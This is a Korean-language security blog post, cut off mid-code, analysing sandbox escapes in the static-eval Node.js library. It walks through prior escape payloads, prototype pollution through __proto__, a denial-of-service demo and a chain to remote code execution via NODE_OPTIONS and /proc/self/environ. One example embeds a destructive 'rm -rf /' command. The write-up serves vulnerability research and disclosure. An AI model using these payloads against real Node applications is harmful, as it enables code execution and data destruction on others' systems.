            <tag> CRLF Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypassing a JS sandbox</title>
      <link href="/bypassing-a-js-sandbox/"/>
      <url>/bypassing-a-js-sandbox/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>컴퓨터 보안에 있어 <code>Sandbox</code> 는 프로그래밍 언어에서 작동중인 프로그램의 <code>Context</code> 를 분리하는 매커니즘으로 운영체제에 대한 접근을 제어하거나, 검증 않은 코드 또는 신뢰할 수 없는 프로그램을 실행할 때 종종 사용됩니다.</p><p>이러한 <code>Sandbox</code> 개념은 <code>NodeJS</code> 에서도 존재하는데, <code>V8</code> 엔진을 기반으로 하여 동작하는 <code>NodeJS</code> 에서는 여타의 언어와는 조금 다른 방식으로 구현되고는 합니다. 코드를 파싱하여 작업을 분배해주는 Event Loop 방식을 사용하고 있기 때문에, 효율적인 자원 관리를 위해 프로세스 격리를 기반으로 하는 것보다는 자바스크립트 네이티브에서 지원하는 <code>Proxy</code> 를 사용한 문맥 기반 제어, 또는 <code>AST</code> 를 기반으로 문법적인 제약을 두는 방법이 주로 쓰입니다.</p><p><code>static-eval</code> 은 <code>esprima</code> 라이브러리를 사용하며, 자바스크립트를 <code>AST (Abstract Syntax Tree)</code> 로 변환하고 생성된 <code>AST</code> 를 기반으로 샌드박스 내에서 전역 객체로 지정할 수 있는 객체가 별도 지정, 주어진 표현식을 <code>wrapping</code>하여 <code>Evaluation</code> 합니다.</p><p><code>Ecma2015</code>의 <code>Proxy</code> 객체를 통해 구현되는 <code>Sandbox</code> 기법과 다르게, 동작 전체가 <code>AST</code> 를 기반으로 행해지기에, <code>parser</code> 역할을 수행하는 <code>esprima</code> 가 지원하지 않는 문법에는 적용이 불가능하다는 단점이 있지만, 의도하지 않은 동작 발생을 보다 확실히 억제할 수 있습니다.</p><p><code>static-eval</code> 모듈은 19년 12월을 기준으로 6447만 다운로드를 기록하였습니다.</p><hr><h2 id="Precedent"><a href="#Precedent" class="headerlink" title="Precedent"></a>Precedent</h2><ul><li>Oct, 2017 (<a href="https://maustin.net/articles/2017-10/static_eval" target="_blank" rel="noopener">matt austin</a>)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.sub.constructor(<span class="string">"console.log(process.env)"</span>)()</span><br></pre></td></tr></table></figure><p>구식의 Sandbox Escape 구문 중의 하나 입니다.</p><p>함수 생성자를 호출하여 익명 함수를 생성함으로써 문맥 탈출이 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'MemberExpression'</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = walk(node.object);</span><br><span class="line">    <span class="keyword">if</span> (obj === FAIL) <span class="keyword">return</span> FAIL;</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === FAIL) || (<span class="keyword">typeof</span> obj == <span class="string">'function'</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> FAIL;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>Vendor</code> 에서는 패치로서 <code>MemberExpression</code> 대상 객체의 타입이 함수일 경우<br>빈 객체를 반환하도록 수정 하였습니다.</p><ul><li>Feb, 2019 (<a href="https://licenciaparahackear.github.io/en/posts/static-eval-sandbox-escape-original-writeup/" target="_blank" rel="noopener">Matías Lang</a>)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">&#123;book&#125;</span>)</span>&#123;<span class="keyword">return</span> book.constructor&#125;)(&#123;<span class="attr">book</span>:<span class="string">""</span>.sub&#125;)(<span class="string">"console.log(process.env)"</span>)()</span><br></pre></td></tr></table></figure><p>인자 참조를 함수를 통해 수행함으로서 <code>MemberExpression</code> 에 대한 필터링을 우회하는 방법입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'FunctionExpression'</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; node.params.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> key = node.params[i];</span><br><span class="line">    <span class="keyword">if</span> (key.type == <span class="string">'Identifier'</span>)&#123;</span><br><span class="line">        vars[key.name] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> FAIL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Vendor</code> 에서는 <code>FunctionExpression</code> 의 parameter key 값에 대응하는<br>가상 전역 객체에 <code>null</code> 을 대입하도록 수정 하였습니다.</p><hr><h2 id="Static-analyze"><a href="#Static-analyze" class="headerlink" title="Static analyze"></a>Static analyze</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evaluate = <span class="built_in">require</span>(<span class="string">'static-eval'</span>);</span><br><span class="line"><span class="keyword">var</span> parse = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">'[1,2,3+4*10+n,foo(3+5),obj[""+"x"].y]'</span>;</span><br><span class="line"><span class="keyword">var</span> ast = parse(src).body[<span class="number">0</span>].expression;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(evaluate(ast, &#123;</span><br><span class="line">    n: <span class="number">6</span>,</span><br><span class="line">    foo: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> x * <span class="number">100</span> &#125;,</span><br><span class="line">    obj: &#123; <span class="attr">x</span>: &#123; <span class="attr">y</span>: <span class="number">555</span> &#125; &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>기본적인 <code>static-eval</code> 모듈의 사용법은 위와 같습니다.<br>파라미터로<code>AST</code> 와 가상 전역 객체를 전달함으로서 비교적 안전하게 수식을 계산할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">ast, vars</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!vars) vars = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> FAIL = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = (<span class="function"><span class="keyword">function</span> <span class="title">walk</span> (<span class="params">node, scopeVars</span>) </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'Identifier'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (&#123;&#125;.hasOwnProperty.call(vars, node.name)) &#123;</span><br><span class="line">                <span class="keyword">return</span> vars[node.name];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> FAIL;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>esprima</code>를 통해 생성된 <code>AST</code> 는 변수에 해당하는 <code>Identifier</code> 의 값은<br>가상 전역 객체를 참조하여 반환하도록 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'MemberExpression'</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = walk(node.object);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === FAIL) || (<span class="keyword">typeof</span> obj == <span class="string">'function'</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> FAIL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.property.type === <span class="string">'Identifier'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.property.name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = walk(node.property);</span><br><span class="line">    <span class="keyword">if</span> (prop === FAIL) <span class="keyword">return</span> FAIL;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MemberExpression</code> 에서는 부모 객체가 함수 형태일 경우, 빈 객체를 반환하도록 합니다.<br>함수 인스턴스 내부의 속성을 참조할 수 없으므로, 함수 생성자 참조가 불가능해집니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unparse = <span class="built_in">require</span>(<span class="string">'escodegen'</span>).generate;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'FunctionExpression'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bodies = node.body.body;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a "scope" for our arguments</span></span><br><span class="line">    <span class="keyword">var</span> oldVars = &#123;&#125;;</span><br><span class="line">    <span class="built_in">Object</span>.keys(vars).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">        oldVars[element] = vars[element];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; node.params.length; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = node.params[i];</span><br><span class="line">        <span class="keyword">if</span>(key.type == <span class="string">'Identifier'</span>)&#123;</span><br><span class="line">            vars[key.name] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> FAIL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> bodies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(walk(bodies[i]) === FAIL)&#123;</span><br><span class="line">            <span class="keyword">return</span> FAIL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// restore the vars and scope after we walk</span></span><br><span class="line">    vars = oldVars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(vars);</span><br><span class="line">    <span class="keyword">var</span> vals = keys.map(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> vars[key];</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Function</span>(keys.join(<span class="string">', '</span>), <span class="string">'return '</span> + unparse(node)).apply(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FunctionExpression</code> 는 <code>static-eval</code> 에서 함수 생성자를 사용하고 있는 유일한 부분입니다.<br><code>escodegen</code> 라이브러리의 함수를 사용해 <code>AST</code> 의 <code>child tree</code> 를 인자로 받아 함수로 만들어 주며<br>생성된 함수의 호출은 <code>CallExpression</code> 을 통해 가능합니다.</p><hr><h2 id="Prototype-Pollution-in-static-eval"><a href="#Prototype-Pollution-in-static-eval" class="headerlink" title="Prototype Pollution in static-eval"></a>Prototype Pollution in static-eval</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'MemberExpression'</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = walk(node.object);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === FAIL) || (<span class="keyword">typeof</span> obj == <span class="string">'function'</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> FAIL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.property.type === <span class="string">'Identifier'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.property.name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = walk(node.property);</span><br><span class="line">    <span class="keyword">if</span> (prop === FAIL) <span class="keyword">return</span> FAIL;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.type === <span class="string">'FunctionExpression'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bodies = node.body.body;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a "scope" for our arguments</span></span><br><span class="line">    <span class="keyword">var</span> oldVars = &#123;&#125;;</span><br><span class="line">    <span class="built_in">Object</span>.keys(vars).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">        oldVars[element] = vars[element];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;node.params.length; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = node.params[i];</span><br><span class="line">        <span class="keyword">if</span>(key.type == <span class="string">'Identifier'</span>)&#123;</span><br><span class="line">            vars[key.name] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> FAIL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> bodies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(walk(bodies[i]) === FAIL)&#123;</span><br><span class="line">            <span class="keyword">return</span> FAIL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// restore the vars and scope after we walk</span></span><br><span class="line">    vars = oldVars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(vars);</span><br><span class="line">    <span class="keyword">var</span> vals = keys.map(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> vars[key];</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Function</span>(keys.join(<span class="string">', '</span>), <span class="string">'return '</span> + unparse(node)).apply(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor</span></span><br><span class="line">ƒ <span class="built_in">Object</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor</span></span><br><span class="line">ƒ <span class="built_in">Function</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor("return process;")</span></span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">return</span> process;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor</span></span><br><span class="line">ƒ <span class="built_in">Object</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor.constructor("return process;")</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure><p><code>MemberExpression</code> 에서 <code>Object.constructor</code> 의 참조는 가능하지만<br>함수 생성자인 <code>Object.constructor.constructor</code> 는 사용이 불가능합니다.</p><p><code>Object.constructor</code> 의 타입이 <code>Function</code> 이며 <code>MemberExpression</code> 에서 함수 타입 객체에 대해서는 어떠한 속성 참조도 금지되어 있기 떄문입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === obj.constructor.prototype);</span><br></pre></td></tr></table></figure><p>그러나 <code>__proto__</code> 속성 참조를 통해 <code>Prototype Pollution</code>을 유발시킬 수 있는데요.<br>자바스크립트에 존재하는 <code>__proto__</code> 속성은 <code>constructor.prototype</code> 의 이중 속성 참조를<br>단번으로 가능하게 하는 별칭과 같은 역할을 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125;)[<span class="string">'__proto__'</span>][<span class="string">'__defineGetter__'</span>](<span class="comment">/* prop */</span>, <span class="comment">/* getter */</span>);</span><br><span class="line">(&#123;&#125;)[<span class="string">'__proto__'</span>][<span class="string">'__defineGetter__'</span>](<span class="string">'polluted'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;)</span><br><span class="line"><span class="comment">// equals to</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">'polluted'</span>, &#123;<span class="attr">value</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><p>여기서 참조한것은 객체 인스턴스의 <code>__proto__.__defineGetter__</code> 인데<br>이는 <code>Object.prototype.__defineGetter__</code> 와 동일하며 <code>Object.defineProperty</code> 와 동일한 역할을 하는데, 우리는 이를 사용해 전역 객체 프로토타입에 정의를 추가할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">'static-eval'</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)['__proto__']['__defineGetter__']('polluted', function()&#123; return true; &#125;)`</span></span><br><span class="line"><span class="keyword">var</span> ast = parse(src).body[<span class="number">0</span>].expression;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="built_in">console</span>.log(polluted); <span class="comment">// print "true"</span></span><br></pre></td></tr></table></figure><p>위와 같은 코드로 <code>static-eval</code> 에서의 프로토타입 오염을 확인할 수 있습니다.</p><p>프로토타입 오염 취약점은 어떻게 활용할 수 있을까요?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">'static-eval'</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)['__proto__']['__defineGetter__']('toString', (&#123;&#125;)['constructor'])`</span></span><br><span class="line"><span class="keyword">var</span> ast = parse(src).body[<span class="number">0</span>].expression;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"></span><br><span class="line"><span class="comment">// serve webapp</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.end(<span class="string">'working!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>객체 생성자 프로토타입에 임의의 속성을 정의해 넣을 수 있는 것만으로 <code>DOS</code> 취약점으로 작용할 수 있습니다. 위 코드를 실행해보면, <code>toString</code> 속성이 오염된 상태에서 <code>express</code> 웹서버가 정상적으로 동작하지 않음을 확인할 수 있습니다.</p><hr><h2 id="Prototype-Pollution-to-Remote-Code-Execution"><a href="#Prototype-Pollution-to-Remote-Code-Execution" class="headerlink" title="Prototype Pollution to Remote Code Execution"></a>Prototype Pollution to Remote Code Execution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inst = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">inst.__proto__.isAdmin = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(isAdmin); <span class="comment">// print "true"</span></span><br></pre></td></tr></table></figure><p>프로토 타입 오염 취약점은 기본적으로 로직 바이패스에 흔히 사용될 수 있습니다.</p><p>세션에 정의되지 않은 속성값을 정의해 놓음으로서 인증을 우회한다던지 하는 방법이죠.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.command = <span class="string">'console.log("executed!")'</span>;</span><br><span class="line"><span class="keyword">if</span> (command) &#123;</span><br><span class="line">  <span class="built_in">eval</span>(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 rce 가 간단하게 가능했으면 좋겠지만, JS world 는 만만하지 않습니다.</p><p>객체 프로토타입 오염에 성공했다고 하더라도, 블랙박스 환경에서는 <code>Denial of Service</code> 이상의 영향력을 보이는 것이 어려울 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/master/lib/child_process.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> env = options.env || process.env;</span><br><span class="line"><span class="keyword">const</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    <span class="keyword">const</span> value = env[key];</span><br><span class="line">    <span class="keyword">if</span> (value !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        envPairs.push(<span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NodeJS의 내장 모듈이며, 서브 프로세스를 생성하는 데에 사용되는<br>child_process 모듈은 자식 프로세스를 생성할 때, 환경 변수를 복사하는 과정을 거치는데<br>복사 과정에 위에서 언급된 <code>for in</code> 반복문을 사용하고 있으므로</p><p>process.env 객체 내부에 직접적으로 정의되지 않았더라도<br>process.env 의 프로토 타입인 Object.prototype 객체가 오염된다면<br>자식 프로세스 생성에 쓰이는 환경 변수를 임의로 추가해낼 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=<span class="string">'--require /proc/self/environ'</span> node app.js</span><br><span class="line"><span class="comment"># same as</span></span><br><span class="line">node --require /proc/self/environ app.js</span><br></pre></td></tr></table></figure><p>또한 NodeJS 프로세스가 실행될 때, 스크립트가 실행되기 이전에 쓰이는 환경 변수중의 하나로 <code>NODE_OPTIONS</code> 환경변수가 존재하는데<br>본 변수에 <code>--require [argv]</code> 와 같은 NodeJS 프로세스 실행에 사용되는 옵션을 추가하면<br>스크립트 실행에 <code>--require [argv]</code> 추가하여 실행한 것과 같은 효과를 줍니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.env = &#123;</span><br><span class="line">  NODE_DEBUG : <span class="string">'require("child_process").execSync("rm -rf /")//'</span>,</span><br><span class="line">  NODE_OPTIONS : <span class="string">'-r /proc/self/environ'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">fork(<span class="string">'blank'</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">spawn(<span class="string">'node'</span>, [<span class="string">'blank'</span>]).stdout.pipe(process.stdout);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="built_in">console</span>.log(spawnSync(<span class="string">'node'</span>, [<span class="string">'blank'</span>]).stdout.toString());</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="built_in">console</span>.log(execSync(<span class="string">'node  blank'</span>).toString());</span><br></pre></td></tr></table></figure><p>위 두가지를 복합적으로 사용하여 <code>RCE</code>를 유발하는 방법입니다.<br>환경 변수에 스크립트를 포함시키고, 환경 변수가 저장되는 <code>/proc/self/environ</code> 파일을 <code>require</code> 옵션 파일로 사용할 수 있습니다.</p><p>서브 프로세스 생성 시에 <code>NODE_DEBUG</code> 환경변수는 <code>/proc/self/environ</code> 에 <code>NODE_OPTIONS</code> 보다 더 앞에 작성되므로<br>일반 환경변수보다, <code>NODE_DEBUG</code> 를 사용하면, <code>reliability</code> 를 가지도록 할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span 